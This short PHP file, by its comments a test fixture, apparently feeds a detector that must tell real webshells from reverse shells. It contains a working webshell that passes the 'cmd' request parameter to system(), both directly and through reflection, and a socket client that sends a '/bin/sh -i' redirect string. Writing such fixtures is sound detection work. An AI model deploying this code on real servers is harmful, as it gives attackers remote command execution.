<?php
// Fixture: indirect request-driven command webshell plus a socket client.
// The shell string is sent as data; it never reaches an execution call.
// Socket and redirected-shell text alone must not imply a reverse shell.
$cmd = 'cmd';
$command = $_REQUEST[$cmd];
$system = 'system';
$exec = new ReflectionFunction($system);
$exec->invoke($command);
system($command);
$ip = $_REQUEST['ip'];
$port = (int)$_REQUEST['port'];
$sock = fsockopen($ip, $port);
$shell = '/bin/sh -i <&3 >&3 3<&0';
fwrite($sock, $shell);
